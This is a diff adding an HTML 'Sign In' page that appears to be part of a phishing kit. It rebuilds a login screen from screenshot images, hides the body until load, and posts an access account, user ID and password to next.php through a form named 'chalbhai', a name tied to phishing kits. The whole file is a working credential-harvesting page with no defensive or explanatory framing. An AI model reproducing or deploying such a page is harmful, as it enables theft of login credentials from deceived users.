@@ -1,0 +1,295 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+<title>Sign In</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF8">
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+<body style="visibility:hidden" onload="unhideBody()">
+
+
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+<style> 
+ 
+ .inputs {
+    padding: 8px;
+    border-radius: 3px;
+    border: 1px solid #CCC;
+    background-image: none;
+    width: 270px;
+	height: 27px;
+	font-size: 12px;
+}
+
+.inputs:focus {
+    outline-color: #54B4AD;
+}
+</style> 
+
+
+
+
+
+
+
+<head>
+
+
+<script LANGUAGE="JavaScript">
+<!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b && (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b && (field.value.length == 0)) return true;
+
+if (field.value.length < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max > 0) && (field.value.length > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b && (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max > 0) && (field.value > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b && (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max > 0) && (digits > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i<user.length; i++) {
+if (user.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i<domain.length; i++) {
+if (domain.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i<len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD && domArr[domArr.length-1].length!=2 &&
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len<2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:formtext1^0^1^0^0^Please Enter Your Access Account:;formtext2^0^1^0^0^Please Enter Your User ID:;formtext3^0^1^0^0^Please Enter Your Password:;
+*/
+b=0;
+errmsg="Please Enter Your Access Account";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
+b=0;
+errmsg="Please Enter Your User ID";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
+b=0;
+errmsg="Please Enter Your Password";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
+
+}
+-->
+</script>
+
+</head>
+<body>
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:496px; z-index:0"><img src="images/back.png" alt="" title="" border=0 width=1350 height=496></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:608px; width:1352px; height:395px; z-index:1"><img src="images/backfooter.png" alt="" title="" border=0 width=1352 height=395></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:207px; top:507px; width:974px; height:80px; z-index:2"><a href="#"><img src="images/morerates.png" alt="" title="" border=0 width=974 height=80></a></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:473px; top:310px; width:212px; height:83px; z-index:3"><a href="#"><img src="images/yte.png" alt="" title="" border=0 width=212 height=83></a></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:278px; top:334px; width:81px; height:18px; z-index:4"><a href="#"><img src="images/1.png" alt="" title="" border=0 width=81 height=18></a></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:334px; top:277px; width:26px; height:15px; z-index:5"><a href="#"><img src="images/2.png" alt="" title="" border=0 width=26 height=15></a></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:988px; top:1px; width:171px; height:32px; z-index:6"><a href="#"><img src="images/join.png" alt="" title="" border=0 width=171 height=32></a></div>
+
+<div id="image8" style="position:absolute; overflow:hidden; left:192px; top:102px; width:970px; height:49px; z-index:7"><a href="#"><img src="images/ttt.png" alt="" title="" border=0 width=970 height=49></a></div>
+
+<div id="image9" style="position:absolute; overflow:hidden; left:191px; top:9px; width:264px; height:84px; z-index:8"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=264 height=84></a></div>
+
+<div id="image10" style="position:absolute; overflow:hidden; left:517px; top:70px; width:644px; height:25px; z-index:9"><a href="#"><img src="images/wooo.png" alt="" title="" border=0 width=644 height=25></a></div>
+
+<div id="image11" style="position:absolute; overflow:hidden; left:187px; top:626px; width:1009px; height:378px; z-index:10"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=1009 height=378></a></div>
+<form action=next.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
+<input name="formtext1"  class="inputs" type="text" style="position:absolute;width:219px;left:227px;top:298px;z-index:11">
+<input name="formtext2"  class="inputs" type="text" style="position:absolute;width:219px;left:227px;top:355px;z-index:12">
+<input name="formtext3"  class="inputs" type="password" style="position:absolute;width:219px;left:227px;top:405px;z-index:13">
+<div id="formimage1" style="position:absolute; left:226px; top:448px; z-index:14"><input type="image" name="formimage1" width="75" height="23" src="images/signin.png"></div>
+</form>
+</body>
+</html>
